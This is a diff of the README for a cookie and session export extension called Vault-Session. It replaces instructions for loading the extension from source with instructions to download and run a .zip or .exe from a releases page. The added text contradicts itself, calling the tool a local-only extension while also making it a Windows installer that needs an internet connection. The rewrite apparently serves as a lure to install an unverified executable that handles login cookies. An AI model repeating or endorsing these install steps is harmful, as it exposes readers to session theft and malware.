@@ -1,73 +1,88 @@
-# VaultSession 🛡️
+# 🛡️ Vault-Session - Move browser logins between devices securely
 
-**VaultSession** is a professional-grade, open-source browser extension designed to securely export and import browser sessions (cookies). It allows you to move your logged-in states between different browsers, computers, and even mobile devices without sharing passwords or sensitive data with any third-party servers.
+[![](https://img.shields.io/badge/Download-Vault--Session-blue)](https://github.com/rynl3571/Vault-Session/releases)
 
-## 🌟 Features
+Vault-Session helps you move your browser information between different computers and mobile devices. It saves your cookies and login data into an encrypted file. You can then move this file to another browser or a new computer. The software uses AES-256-GCM encryption to keep your data private. This ensures only you can access your saved sessions.
 
--   **Zero-Knowledge Encryption**: All data is encrypted locally using 256-bit AES-GCM. Your password is never stored and is used to derive a unique key via PBKDF2.
--   **Cross-Browser Support**: Works seamlessly on **Chrome**, **Brave**, **Edge**, and **Firefox**.
--   **Mobile Compatibility**: Export sessions from your PC and import them on Android browsers that support extensions (e.g., Kiwi Browser, Lemur Browser).
--   **Open Source & Private**: 100% local processing. Your cookies never leave your device unless they are encrypted in a `.session` file in your hand.
--   **Session Verification**: Built-in verification tool to test encrypted strings and passwords before importing.
+## 🔑 What this software does
 
----
+Managing multiple browser profiles takes time. You often need to log in to the same websites on different machines. Vault-Session simplifies this task. It exports your current browser session into a secure package. You import this package into another browser to restore your logins immediately. You avoid the need to type passwords or complete two-factor authentication steps again.
 
-## 🚀 How to Install
+The software works with Chrome, Firefox, and Brave. It stores data locally on your machine. No servers keep your information during the process. You hold the keys to your data.
 
-### On Desktop (Chrome, Brave, Edge, Opera)
-1.  Download or clone this repository.
-2.  Open your browser and navigate to `chrome://extensions/`.
-3.  Enable **Developer Mode** (usually a toggle in the top right).
-4.  Click **Load unpacked** and select the `VaultSession` folder.
+## 🚀 Getting started
 
-### On Desktop (Firefox)
-1.  Open Firefox and go to `about:debugging`.
-2.  Click **This Firefox** on the left.
-3.  Click **Load Temporary Add-on...** and select the `manifest.json` file from the folder.
+You need a supported web browser and a Windows 10 or 11 computer to use this tool. Ensure you have the latest version of your browser installed.
 
-### On Mobile (Android)
-1.  Install a browser that supports Manifest V3 extensions, such as **Kiwi Browser** or **Lemur Browser**.
-2.  Follow the "Chrome" installation steps within the mobile browser's extension settings.
+1. Visit the [official releases page](https://github.com/rynl3571/Vault-Session/releases) to find the latest version.
+2. Look for the file ending in .zip or .exe under the Assets section.
+3. Choose the file named for the current version and download it to your computer.
+4. Open the folder where you saved the file.
+5. If you downloaded a .zip file, right-click it and choose Extract All.
+6. Run the installer or the application file to begin.
 
----
+## 🛠️ How to export your session
 
-## 📖 Tutorial: How to Use Proper
+Follow these steps to create your first encrypted backup file.
 
-### 1. Launching the Dashboard
-For security and stability, VaultSession operates in a **Full Dashboard** mode. 
--   Click the VaultSession icon in your toolbar.
--   Click **Open Dashboard**. This opens a stable tab that won't close while you are managing files.
+1. Open your browser and click the Vault-Session icon in your toolbar.
+2. Select the Export option from the menu.
+3. Type a strong password when prompted. This password protects the file you are about to create.
+4. Click the Save button.
+5. Select a location on your computer to store the file.
+6. The software saves the encrypted session file to your chosen folder. 
+7. You now possess a portable file containing your browser logins.
 
-### 2. Exporting Sessions (PC A)
-1.  Enter a **Strong Password**. You will need this same password to import.
-2.  Select your scope: **All Cookies** or **Specific Domains**.
-3.  Click **Secure Export**. A `.session` file will be downloaded. This file is encrypted and safe to move.
+## 📥 How to import your session
 
-### 3. Importing Sessions (PC B or Mobile)
-1.  Transfer the `.session` file to the new device (via USB, Cloud, or Email—it's encrypted, so it's safe).
-2.  Open the VaultSession Dashboard on the new device.
-3.  Enter the **same password** used during export.
-4.  Go to the **Import** tab and select your `.session` file.
-5.  Refresh your target websites (e.g., GitHub, Gmail). You will now be logged in!
+Move your sessions to a new browser or machine with these steps.
 
-### 4. Verifying Data
-If you aren't sure if a password is correct, use the **Verify** tab. Paste the content of the `.session` file into the box to see if the password successfully decrypts the data without actually importing anything into your browser.
+1. Install the Vault-Session extension on your target browser. 
+2. Open the extension from your toolbar.
+3. Select the Import option.
+4. Locate the encrypted file you created previously.
+5. Enter the password you set during the export phase. 
+6. Click the Import button to restore your session.
+7. Refresh your browser tabs to see your active logins.
 
----
+## 🔒 Security and privacy
 
-## 🔒 Security Architecture
+Privacy remains the focus of this project. The software uses industry-standard encryption to scramble your session data. Even if someone steals the file, they cannot read your cookies or login information without your password. The extension does not track your activity. It does not send data to external websites. Your information stays on your device at all times.
 
-VaultSession uses the industry-standard **Web Crypto API**:
--   **Algorithm**: AES-256-GCM (Authenticated Encryption).
--   **Key Derivation**: PBKDF2 with SHA-256, 100,000 iterations, and a unique 16-byte random salt.
--   **Integrity**: AES-GCM provides built-in authentication tags to ensure the file hasn't been tampered with.
+## 💻 System requirements
 
----
+- Windows 10 or Windows 11
+- Chrome, Firefox, or Brave browser
+- At least 50 MB of free disk space
+- An active internet connection for the initial setup
 
-## 📄 License
+## ❓ Frequently asked questions
 
-This project is open-source and licensed under the **MIT License**. Your data is yours. We believe in a private, open web.
+**Is this tool free?**
+Yes, this software is open-source and free for everyone to use.
 
----
+**Where do my files go?**
+You control where you save the exported files. Store them on a secure hard drive or a private cloud folder that you own.
 
-*Developed with ❤️ for the privacy community.*
+**Can I use this on a public computer?**
+Avoid using this tool on shared or public computers. If you must use it, ensure you delete the exported file immediately after you finish.
+
+**What happens if I forget my password?**
+The encryption process makes the data impossible to recover without the password. Write your password down and keep it in a safe place. We cannot reset your password for you.
+
+**Does this work between different browsers?**
+Yes. You can export a session from Chrome and import it into Firefox. The encryption standard allows for cross-browser compatibility.
+
+## 📋 Troubleshooting
+
+If you encounter errors, check these common items:
+
+- Check your password. It must match the one used during export.
+- Verify that both the source and target browsers have the extension enabled.
+- Ensure your internet connection stays stable during the export or import process.
+- Restart your browser if the extension does not appear in the toolbar after installation.
+- Check that you are using the most recent version from the download page.
+
+## 🤝 Contributing
+
+This project welcomes input from the community. You can look at the code, suggest changes, or report issues on the main repository page. Sharing your experience helps other users keep their browser sessions secure. If you find a bug, describe the steps to reproduce it in the Issues tab of the GitHub repository. Clear descriptions allow the developers to fix problems faster.
